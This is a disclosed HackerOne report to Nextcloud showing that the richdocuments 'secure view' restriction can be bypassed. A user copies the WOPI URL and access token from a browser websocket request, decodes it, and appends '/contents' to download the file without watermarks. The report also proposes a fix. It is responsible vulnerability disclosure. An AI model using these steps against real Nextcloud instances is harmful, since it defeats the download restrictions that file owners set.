# Secure view trivial to bypass

## Report Details
- **Report ID**: 1724021
- **URL**: https://hackerone.com/reports/1724021
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-10-06T07:01:22.461Z
- **Disclosed**: 2023-03-30T08:14:42.255Z

## Reporter
- **Username**: rullzer
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
While messing with https://hackerone.com/reports/1724016 I also noticed that it is even easier to bypass secure view.
Especially in NC 25 where you explicitly name the checkbox download a user will assume that downloading is thus not allowed or possible.

However if richdocuments is installed and properly configured. A user can still easily fetch those files.

All they have to do is open their browser and see the request that is like

```
ws://127.0.0.1:9980/cool/http%3A%2F%2F127.0.0.1%2Findex.php%2Fapps%2Frichdocuments%2Fwopi%2Ffiles%2F149_oc13vsnxh17n%3Faccess_token%3Dr7v1y7DI6gcgvzcG85fJE0TCa0IJXvnQ%26access_token_ttl%3D1665034074000/ws?WOPISrc=http%3A%2F%2F127.0.0.1%2Findex.php%2Fapps%2Frichdocuments%2Fwopi%2Ffiles%2F149_oc13vsnxh17n&compat=/ws
```

Now we extract out the internal part

```
http%3A%2F%2F127.0.0.1%2Findex.php%2Fapps%2Frichdocuments%2Fwopi%2Ffiles%2F149_oc13vsnxh17n%3Faccess_token%3Dr7v1y7DI6gcgvzcG85fJE0TCa0IJXvnQ%26access_token_ttl%3D1665034074000
```

We url decode it

```
http://127.0.0.1/index.php/apps/richdocuments/wopi/files/149_oc13vsnxh17n?access_token=r7v1y7DI6gcgvzcG85fJE0TCa0IJXvnQ&access_token_ttl=1665034074000
```

Now lets add a `/contents` to the url

```
http://127.0.0.1/index.php/apps/richdocuments/wopi/files/149_oc13vsnxh17n/conents?access_token=r7v1y7DI6gcgvzcG85fJE0TCa0IJXvnQ&access_token_ttl=1665034074000
```

And there you have it. Downloaded without watermarks.

## Impact

The checkbox as is misleads users into assuming that the file can't be downloaded.
However getting it is easy for anybody that tries.

A solution here would be to agree on some kind of public key cryptography or at the very least a shared secret between collabora and the Nextcloud instance. This could for example be passed via a header when doing calls. ensuring that only collabora can actually retrieve the file info, documents etc.

## Attachments
No attachments
